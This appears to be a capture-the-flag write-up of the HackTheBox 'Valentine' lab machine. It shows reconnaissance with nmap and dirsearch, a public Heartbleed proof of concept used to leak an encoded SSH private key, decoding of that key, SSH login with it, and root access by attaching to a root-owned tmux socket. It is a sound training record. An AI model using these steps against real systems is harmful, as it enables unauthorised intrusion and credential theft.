Begin by adding the target machine IP to `/etc/hosts`.

```bash
nano /etc/hosts
```

![[HackTheBox/Valentine/images/1.png]]

`sudo nmap -sV -sC valentine.htb`

![[HackTheBox/Valentine/images/2.png]]

I also conducted an `NSE script` scan against the vulnerable target.

```bash
sudo nmap -sV --script=vuln valentine.htb --max-rate=10000
```

![[HackTheBox/Valentine/images/3.png]]

Meanwhile, directory fuzzing also proved useful.

```bash
dirsearch -u http://valentine.htb -w /usr/share/dirb/wordlists/common.txt 
```

![[HackTheBox/Valentine/images/4.png]]

Let's check the `/dev/` endpoint.

The directory contains two files, so I checked them.

![[HackTheBox/Valentine/images/5.png]]

In the `notes.txt` file, the author mentions a mechanism related to a key:

```bash
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

Since the vulnerability is related to a key, and the Nmap results point to a Heartbleed-related vulnerability — as the default page also implies — I looked into the Heartbleed exploit.

![[HackTheBox/Valentine/images/6.png]]

I discovered a GitHub repo containing the related vulnerability PoC.

[HeartBleed Exploit](https://github.com/sensepost/heartbleed-poc)

Using the exploit as follows:

```bash
python2 heartbleed-poc.py 10.129.232.136 80
```

I was not able to run it via `python3`, so it most likely only works with Python 2.

The heartbeat response revealed a Base64-encoded string referencing `decode.php`.

![[HackTheBox/Valentine/images/7.png]]

```bash
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```


[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=YUdWaGNuUmliR1ZsWkdKbGJHbGxkbVYwYUdWb2VYQmxDZz09) automatically decoded the text.

![[HackTheBox/Valentine/images/8.png]]

I could not identify the format, so I passed it through `DenCode`.

[DenCode](https://dencode.com/en/)

![[HackTheBox/Valentine/images/9.png]]

Now it is clear that the hexadecimal encoding reveals an SSH private key, but it still did not work directly.

[Decoding HEX](https://lindevs.com/hex-encode-and-decode-on-linux)

Therefore, I used the following techniques to extract the SSH key.

[DECODE HEX](https://lindevs.com/hex-encode-and-decode-on-linux)

```bash
xxd -p -r encoded_data.txt out.txt

# MAKE THE key CLEAR

openssl rsa -in out.txt -out clean_key
```

Then I used the extracted key to authenticate via SSH.

```bash
ssh -i clean_key hype@valentine.htb
```

![[HackTheBox/Valentine/images/10.png]]

Initially, I could not find a privilege escalation vector. I transferred `linpeas.sh` to the target to enumerate further.

![[HackTheBox/Valentine/images/11.png]]

![[HackTheBox/Valentine/images/12.png]]

In the `linpeas.sh` results, a `tmux` session was found running as root:

![[HackTheBox/Valentine/images/13.png]]

```bash
/usr/bin/tmux -S /.devs/dev_sess
```

Running the binary directly with the `-S` flag attaches to the root session.

![[HackTheBox/Valentine/images/14.png]]

